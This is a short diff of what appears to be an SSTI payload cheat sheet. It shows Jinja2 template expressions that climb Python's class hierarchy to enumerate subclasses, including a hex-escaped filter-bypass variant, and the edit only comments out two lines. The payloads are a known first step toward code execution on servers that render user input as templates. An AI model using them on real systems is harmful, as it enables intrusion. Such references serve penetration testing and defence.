@@ -178,14 +178,14 @@ dict.__mro__[-1]
 {{ dict.mro()[-1].__subclasses__() }}
 {{ (dict.mro()[-1]|attr("\x5f\x5fsubclasses\x5f\x5f"))() }}
 
-{% with a = dict.mro()[-1].__subclasses__() %} {{ a }} {% endwith %}
+#{% with a = dict.mro()[-1].__subclasses__() %} {{ a }} {% endwith %}
 
 # Other examples using these ways
 {{ ().__class__.__base__.__subclasses__() }}
 {{ [].__class__.__mro__[-1].__subclasses__() }}
 {{ ((""|attr("__class__")|attr("__mro__"))[-1]|attr("__subclasses__"))() }}
 {{ request.__class__.mro()[-1].__subclasses__() }}
-{% with a = config.__class__.mro()[-1].__subclasses__() %} {{ a }} {% endwith %}
+#{% with a = config.__class__.mro()[-1].__subclasses__() %} {{ a }} {% endwith %}
 ```
 
 # Bypass SSTI Filtering
